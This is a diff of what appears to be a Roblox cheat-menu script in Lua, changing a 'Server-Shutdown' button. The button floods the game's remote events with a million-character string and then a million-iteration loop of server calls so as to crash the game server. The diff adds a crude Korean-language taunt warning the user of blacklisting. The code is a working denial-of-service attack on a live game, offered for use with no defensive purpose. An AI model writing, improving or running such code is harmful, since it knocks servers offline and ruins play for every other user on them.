@@ -36086,9 +36086,12 @@ Escape Timer: %*]]
 local SERVER = tbl15.Combat:AddRightGroupbox("SERVER SHUTDOWN", "spline")
 SERVER:AddDivider("Good bye Server")
 SERVER:AddButton({
-	Text = "Kick Server",
+	Text = " Server-Shutdown",
 	DoubleClick = true,
+	Risky = true,
 	Func = function()
+		fn18("씨발! 너가 서버를 날렸어. 한국섭이라면 블랙리스트가 될거야", "ALPHA", nil, 6)
+
 		local RS = game:GetService("ReplicatedStorage")
 		local Event1 = RS:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
 		Event1:FireServer(("ALPHA"):rep(1e6))
@@ -36096,7 +36099,7 @@ SERVER:AddButton({
 		task.wait()
 
 		local Event = RS:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
-		Event:FireServer(("AAAA"):rep(1))
+		Event:FireServer(("AAA"):rep(1))
 
 		for i = 1, 1e6 do
 			Event:FireServer()
